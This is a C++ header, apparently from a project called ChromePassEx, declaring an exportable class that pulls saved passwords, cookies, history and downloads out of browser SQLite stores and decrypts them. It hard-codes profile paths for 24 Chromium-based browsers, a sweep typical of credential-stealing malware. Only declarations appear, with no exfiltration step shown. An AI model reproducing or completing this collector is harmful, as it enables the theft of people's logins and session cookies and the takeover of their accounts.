#pragma once
#include "WinApiImport.h"
#include "sqlite3.h"
#include <memory>
#include "Base64.h"
#include "cJSON.h"
#include "Data.h"
#include <string>
#include <list>

#include "ChromeDecrypt.h"
#ifdef ChromePassEx_EXPORTS

#define EXPORT_F __declspec(dllexport)

#else

#define EXPORT_F 

#endif


#define V10_LEN 3
#define NONCE_LEN 12
#define MAX_SIZE 1024


class  EXPORT_F ChromeCollecter 
{
public:
	ChromeCollecter() = default;

	 ~ChromeCollecter() = default;

	 void collectPasswords(std::list<userData>& userDataList);
	 void collectCookies(std::list<CookieData>& cookieDataList);
	 void collectHistory(std::list<historyData>& historyDataList);
	 void collectDownloads(std::list<downloadsData>& downloadsDataList);


private:
	bool prepareToGoOverSqlite(const std::string& chromePath, const std::string& infoPath);
	void collectPasswordsFromSqlite(std::list<userData>& userDataList);
	void collectCookiesFromSqlite(std::list<CookieData>& cookieDataList);
	void collectHistoryFromSqlite(std::list<historyData>& historyDataList);
	void collectDownloadsFromSqlite(std::list<downloadsData>& downloadsDataList);

	bool getDbPath(const std::string& chromePath, const std::string& infoPath);
	std::string m_chromeSqlitePath;
	ChromeDecrypt m_decryptor;

	const std::vector<std::string> m_chromeList{

		"\\Google\\Chrome",
		"\\Google(x86)\\Chrome",
		"\\Chromium",
		"\\Microsoft\\Edge",
		"\\BraveSoftware\\Brave-Browser",
		"\\Epic Privacy Browser",
		"\\Amigo",
		"\\Vivaldi",
		"\\Orbitum",
		"\\Mail.Ru\\Atom",
		"\\Kometa",
		"\\Comodo\\Dragon",
		"\\Torch",
		"\\Comodo",
		"\\Slimjet",
		"\\360Browser\\Browser",
		"\\Maxthon3",
		"\\K-Melon",
		"\\Sputnik\\Sputnik",
		"\\Nichrome",
		"\\CocCoc\\Browser",
		"\\uCozMedia\\Uran",
		"\\Chromodo",
		"\\Yandex\\YandexBrowser"
	};
	
};



